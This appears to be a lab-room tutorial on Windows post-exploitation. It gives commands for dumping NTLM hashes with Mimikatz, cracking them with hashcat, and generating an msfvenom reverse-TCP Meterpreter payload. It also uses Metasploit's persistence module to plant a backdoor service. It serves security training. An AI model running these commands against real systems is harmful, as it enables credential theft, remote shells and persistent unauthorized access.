# Introduction

## Start Machine

This room will cover all of the basics of post-exploitation; we'll talk about everything from post-exploitation enumeration with PowerView and BloodHound, dumping hashes and Golden Ticket attacks with Mimikatz, basic information gathering using Windows Server tools and logs. We will then wrap up this room by discussing the basics of maintaining access with the persistence Metasploit module and creating a backdoor into the machine to get an instant Meterpreter shell if the system is ever shut down or reset.

This room will be related to very real-world applications and will most likely not help with any CTFs. However, this room will provide great foundational knowledge on how to approach a network after gaining a shell on a machine.

To start this room, deploy the machine and proceed to the next section on enumerating with PowerView.

---

# Dumping Hashes w/ Mimikatz

Mimikatz is a very popular and powerful post-exploitation tool mainly used for dumping user credentials inside of an Active Directory network.

We'll be focusing on dumping the NTLM hashes with Mimikatz and then cracking those hashes using Hashcat.

I have already taken the time to put Mimikatz on the machine.

## Dump Hashes w/ Mimikatz

1. `cd Downloads && mimikatz.exe`  
   This will navigate into the directory where Mimikatz is kept as well as run the Mimikatz binary.

2. `privilege::debug`  
   Ensure that the output is `Privilege '20' ok`. This ensures that you're running Mimikatz as an administrator; if you don't run Mimikatz as an administrator, it will not run properly.

3. `lsadump::lsa /patch`  
   Dump those hashes!

## Crack Those Hashes w/ Hashcat

1. `hashcat -m 1000 <hash> rockyou.txt`

Mimikatz has many uses alongside being a great tool to dump hashes. We will cover another one of those ways of using Mimikatz in the next task by creating a Golden Ticket with Mimikatz.

---

# Maintaining Access

There are quite a few ways to maintain access on a machine or network. We will be covering a fairly simple way of maintaining access by first setting up a Meterpreter shell and then using the persistence Metasploit module, allowing us to create a backdoor service in the system that will give us an instant Meterpreter shell if the machine is ever shut down or reset.

There are also other ways of maintaining access such as advanced backdoors and rootkits; however, those are out of scope for this room.

This will require a little more manual setup than the other tasks, so it is recommended to have previous knowledge of `msfvenom` and Metasploit.

## Generating a Payload w/ msfvenom

1. `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_IP> LPORT=<your_port> -f exe -o shell.exe`  
   This will generate a basic Windows Meterpreter reverse TCP shell.

2. Transfer the payload from your attacker machine to the target machine.
3. `use exploit/multi/handler`  
   This will create a listener on the port that you set it on.
4. Configure our payload to be a Windows Meterpreter shell:  
   `set payload windows/meterpreter/reverse_tcp`
5. After setting your THM IP address as your `LHOST`, start the listener with `run`.
6. Executing the binary on the Windows machine will give you a Meterpreter shell back on your host.
7. Verify that we've got a Meterpreter shell, where we will then background it to run the persistence module.

## Run the Persistence Module

1. `use exploit/windows/local/persistence`  
   This module will send a payload every 10 seconds by default; however, you can set this time to anything you want.
2. `set session 1`  
   Set the session to the session that we backgrounded in Meterpreter (you can use the `sessions` command in Metasploit to list the active sessions).

If the system is shut down or reset for whatever reason, you will lose your Meterpreter session. However, by using the persistence module, you create a backdoor into the system, which you can access at any time using the Metasploit multi-handler and setting the payload to `windows/meterpreter/reverse_tcp`, allowing you to send another Meterpreter payload to the machine and open up a new Meterpreter session.

Here you can see the session die; however, the second we run the handler again, we get a Meterpreter shell back thanks to the persistence service.

There are other ways of maintaining access, such as adding users and rootkits. However, I will leave you to do your own research and labs on those topics.
